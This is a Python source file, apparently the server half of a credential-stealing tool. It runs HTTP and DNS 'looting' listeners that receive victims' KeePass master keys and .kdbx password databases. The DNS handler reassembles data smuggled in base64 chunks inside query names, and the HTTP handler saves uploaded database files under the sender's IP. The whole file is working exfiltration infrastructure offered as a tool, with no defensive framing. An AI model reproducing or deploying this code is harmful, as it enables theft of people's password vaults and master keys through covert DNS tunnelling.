#!/usr/bin/python3

import cgi
import base64
import socketserver
from dnslib import DNSRecord, DNSHeader
from socketserver import BaseRequestHandler as BaseDNSRequestHandler
from http.server import HTTPServer, BaseHTTPRequestHandler

def helper_padded_b64_decode(s: str):
    padding = 4
    while padding >= 0:
        try:
            return base64.urlsafe_b64decode(s + '=' * padding)
        except:
            print(f"[-] Decode with len {padding} failed")
            padding -= 1

class AxiomHttpHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        message = "<html><body><h1>It works !</h1></body></html>"
        self.wfile.write(message.encode('utf-8'))

    def do_POST(self):
        print(f"[+] Received connection on {self.path} from {self.client_address[0]}")

        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={ #type: ignore
                'REQUEST_METHOD':'POST',
                'CONTENT_TYPE': self.headers.get('Content-Type'),
                'CONTENT_LENGTH': self.headers.get('Content-Length')
            }
        )
        f = form['file']
        mk = form['MasterKey'].filename
        filename = self.client_address[0] + "_" + f.filename
        with open(filename, "wb") as db:
            db.write(f.value)
        print(f"[+] Received DB {filename} with master key: {mk}")

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        message = "<html><body><h1>It works !</h1></body></html>"
        self.wfile.write(message.encode('utf-8'))

    def log_message(self, format, *args):
        pass

class AxiomUDPHandler(BaseDNSRequestHandler):
    identifiers = {}
    masterkeys = {}
    kdbx = {}

    def handle(self):
        try:
            data = self.get_data()
            request = DNSRecord.parse(data)
            #print(request)
            #print("============================================")

            # QTYPE 1 means it requested A record, AAAA is 28
            # Only proccess one of them so we don't get doubled data
            # A type is the most common
            if request.q.qtype == 1:
                identifier = str(request.q.qname).split('.')[0]
                datatype = str(request.q.qname).split('.')[1]
                payload = str(request.q.qname).split('.')[2]
                print(request.q.qname)

                match datatype:
                    case "USR":
                        AxiomUDPHandler.identifiers[identifier] = payload
                        print(f"[+] User {helper_padded_b64_decode(payload).decode()} is reaching out")

                    case "KEY":
                        if identifier not in AxiomUDPHandler.masterkeys:
                            AxiomUDPHandler.masterkeys[identifier] = ""

                        if payload == "EOF":
                            print("Decoding master key")
                            mk = helper_padded_b64_decode(AxiomUDPHandler.masterkeys[identifier])
                            print(f"[+] User {AxiomUDPHandler.identifiers[identifier]}'s Master Key: {mk}")
                            print(AxiomUDPHandler.masterkeys[identifier])
                            del AxiomUDPHandler.masterkeys[identifier]
                        else:
                            AxiomUDPHandler.masterkeys[identifier] += payload

                    case "DB":
                        if identifier not in AxiomUDPHandler.kdbx:
                            AxiomUDPHandler.kdbx[identifier] = ""

                        if payload == "EOF":
                            user = helper_padded_b64_decode(AxiomUDPHandler.identifiers[identifier])
                            print(f"[+] Received {user.decode()}'s DB file")
                            f = open(f"./{user.decode()}.1.kdbx","wb")
                            f.write(helper_padded_b64_decode(AxiomUDPHandler.kdbx[identifier]))
                            f.close()
                            del AxiomUDPHandler.kdbx[identifier]
                        else:
                            AxiomUDPHandler.kdbx[identifier] += payload
                            print(f"[*] Receiving {identifier}'s kdbx file")

                #print(f"[+] Queried: {payload}")

            # We must send a reply, even if empty, so that the client
            # doesn't spam retransmissions
            # By default, it will retransmit 5 times if it receives no answer or a malformed reply
            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
            self.send_data(reply.pack())
        except Exception as e:
            print(f"[-] Error: {e}")

    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)

def run_http_listener(port: int):
    server_address = ('', port)
    httpd = HTTPServer(server_address, AxiomHttpHandler)
    print(f"[+] Started looting listener on port {port}")
    httpd.serve_forever()

def run_dns_listener(port: int):
    server_address = ('', port)
    dns = socketserver.UDPServer(server_address, AxiomUDPHandler)
    print(f"[+] Started looting DNS server on port {port}")
    dns.serve_forever()

